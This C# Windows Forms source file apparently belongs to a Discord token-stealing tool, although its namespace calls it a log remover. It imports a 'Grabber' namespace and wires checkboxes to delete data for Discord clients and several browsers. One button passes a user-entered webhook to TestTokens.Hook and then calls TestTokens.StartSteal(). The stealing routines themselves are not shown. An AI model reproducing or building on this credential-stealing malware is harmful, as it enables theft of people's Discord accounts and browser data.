using Grabber;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Remove_Logs_Discord
{
    public partial class Form1 : Form
    {
        public static Point newpoint = new Point();
        public static int x;
        public static int y;

        public Form1()
        {
            InitializeComponent();
        }

        Config.Discord DISCORD = new Config.Discord();
        Config.DiscordPTB DISCORDPTB = new Config.DiscordPTB();
        Config.DiscordCanary DISCORDCANARY = new Config.DiscordCanary();
        Config.Chrome CHROME = new Config.Chrome();
        Config.Firefox FIREFOX = new Config.Firefox();
        Config.Opera OPERA = new Config.Opera();
        Config.OperaGX OPERAGX = new Config.OperaGX();
        Config.Brave BRAVE = new Config.Brave();
        Config.Lightcord LIGHTCORD = new Config.Lightcord();
        Config.Yandex YANDEX = new Config.Yandex();

        #region "System Move Title Panel"
        private void xMouseDown(object sender, MouseEventArgs e)
        {
            x = Control.MousePosition.X - base.Location.X;
            y = Control.MousePosition.Y - base.Location.Y;
        }
        private void xMouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                newpoint = Control.MousePosition;
                newpoint.X -= x;
                newpoint.Y -= y;
                base.Location = newpoint;
            }
        }
        #endregion

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            if (guna2CheckBox1.Checked)
            {
                DISCORD.DELETE();
            }
            if (guna2CheckBox2.Checked)
            {
                DISCORDPTB.DELETE();
            }
            if (guna2CheckBox3.Checked)
            {
                DISCORDCANARY.DELETE();
            }
            if (guna2CheckBox4.Checked)
            {
                CHROME.DELETE();
            }
            if (guna2CheckBox5.Checked)
            {
                FIREFOX.DELETE();
            }
            if (guna2CheckBox6.Checked)
            {
                OPERA.DELETE();
            }
            if (guna2CheckBox7.Checked)
            {
                OPERAGX.DELETE();
            }
            if (guna2CheckBox8.Checked)
            {
                YANDEX.DELETE();
            }
            if (guna2CheckBox9.Checked)
            {
                LIGHTCORD.DELETE();
            }
            if (guna2CheckBox10.Checked)
            {
                BRAVE.DELETE();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.gunaElipsePanel1.MouseDown += this.xMouseDown; //For Move Form
            this.gunaElipsePanel1.MouseMove += this.xMouseMove; //For Move Form
            this.gunaElipsePanel1.MouseDown += this.xMouseDown; //For Move Form
            this.gunaElipsePanel1.MouseMove += this.xMouseMove; //For Move Form
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            TestTokens.Hook = guna2TextBox1.Text;
            TestTokens.StartSteal();
        }
    }
}
